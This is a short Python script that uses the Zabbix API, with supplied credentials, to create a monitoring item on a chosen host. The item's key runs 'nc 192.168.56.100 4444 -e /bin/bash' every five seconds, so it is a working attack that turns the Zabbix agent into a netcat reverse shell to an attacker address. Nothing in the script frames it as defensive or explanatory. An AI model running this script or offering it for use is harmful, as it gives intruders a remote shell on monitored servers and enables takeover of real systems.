from pyzabbix import ZabbixAPI, ZabbixAPIException
import sys

api_address=raw_input("enter correct URL to api_jsonrpc.php, like http://192.168.56.102/zabbix/api_jsonrpc.php"": \n")
user= raw_input("enter username: \n")
password= raw_input("enter password: \n")
hostname=raw_input("enter hostname: \n")
# hostid=raw_input("enter hostid: \n")

zapi = ZabbixAPI(api_address)

# Login to the Zabbix API
zapi.login(user, password)

host_name = hostname
hosts = zapi.host.get(filter={"host": host_name}, selectInterfaces=["interfaceid"])
if hosts:
    host_id = hosts[0]["hostid"]
    print("Found host id {0}".format(host_id))

    try:
        item = zapi.item.create(
            hostid=host_id,
            name='netcat_create_reverse_shell',
            key_='system.run["nc 192.168.56.100 4444 -e /bin/bash"]',
            type=0,
            value_type=4,
            interfaceid=hosts[0]["interfaces"][0]["interfaceid"],
            delay=5
        )
    except ZabbixAPIException as e:
        print(e)
        sys.exit()
    print("Added item with itemid {0} to host: {1}".format(item["itemids"][0], host_name))
else:
    print("No hosts found")

